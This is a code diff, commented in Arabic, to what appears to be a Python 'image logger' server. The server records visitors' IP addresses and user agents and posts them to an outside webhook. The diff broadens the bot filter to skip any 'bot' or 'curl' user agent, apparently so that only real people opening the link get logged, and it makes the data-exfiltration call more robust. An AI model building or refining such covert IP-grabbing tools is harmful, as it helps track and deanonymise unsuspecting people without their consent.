@@ -12,11 +12,17 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
+# إضافة Check على User-Agent للتأكد من أن المستخدم ليس روبوتًا
+def is_valid_user_agent(useragent):
+    if "bot" in useragent.lower() or "curl" in useragent.lower():
+        return False
+    return True
+
 def makeReport(ip, useragent, image_url):
     # يمنع البوتات والمصادر المحظورة
     if any(ip.startswith(prefix) for prefix in blacklistedIPs):
         return
-    if useragent and any(bot in useragent for bot in ["Discordbot", "TelegramBot", "Slackbot"]):
+    if useragent and not is_valid_user_agent(useragent):
         return
 
     try:
@@ -43,7 +49,13 @@ def makeReport(ip, useragent, image_url):
         }]
     }
 
-    requests.post(config["webhook"], json=embed)
+    # إرسال البيانات إلى الويبهوك
+    try:
+        response = requests.post(config["webhook"], json=embed)
+        if response.status_code != 200:
+            print(f"Failed to send data to webhook: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending data to webhook: {str(e)}")
 
 class LoggerHandler(BaseHTTPRequestHandler):
     def handleRequest(self):
